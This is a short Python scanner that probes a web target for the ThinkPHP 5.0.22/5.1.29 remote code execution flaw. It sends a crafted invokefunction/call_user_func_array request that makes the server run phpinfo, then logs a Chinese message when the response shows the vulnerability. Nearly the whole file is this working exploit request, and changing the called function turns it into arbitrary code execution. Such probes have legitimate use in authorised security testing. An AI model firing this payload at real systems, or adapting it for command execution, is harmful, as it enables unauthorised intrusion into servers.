# -*-coding:utf-8-*-
import requests

class tp5:
    def check_tp5(self, url):
        url = url + r"/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1%20and%20it%27ll%20execute%20the%20phpinfo"
        re = requests.get(url).text
        if "PHP Version" in re:
            print("    \033[0;36;31m存在Thinkphp5-5.0.22/5.1.29远程执行代码漏洞!\033[0m")
            with open("tp_check.log", "a+") as f:
                f.write("存在Thinkphp5-5.0.22/5.1.29远程执行代码漏洞!\n\n")
#            res.close()